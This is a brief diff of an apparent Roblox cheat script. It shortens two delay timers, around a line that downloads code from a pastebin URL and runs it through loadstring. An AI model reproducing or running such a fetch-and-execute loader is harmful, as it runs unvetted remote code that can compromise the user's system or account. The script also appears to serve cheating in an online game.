@@ -38,13 +38,13 @@ game:GetService('RunService').RenderStepped:Connect(function()
 end)
 
 -- Wait for a delay before executing the second script
-wait(1) -- Adjust the delay time as needed
+wait(0.1) -- Adjust the delay time as needed
 
 -- Script 2: External Script Loader
 loadstring(game:HttpGet("https://pastebin.com/raw/cgL2t70F"))()
 
 -- Wait for a delay before executing the second script
-wait(1) -- Adjust the delay time as needed
+wait(0.1) -- Adjust the delay time as needed
 
 -- instancing
 local drawing_new = Drawing.new
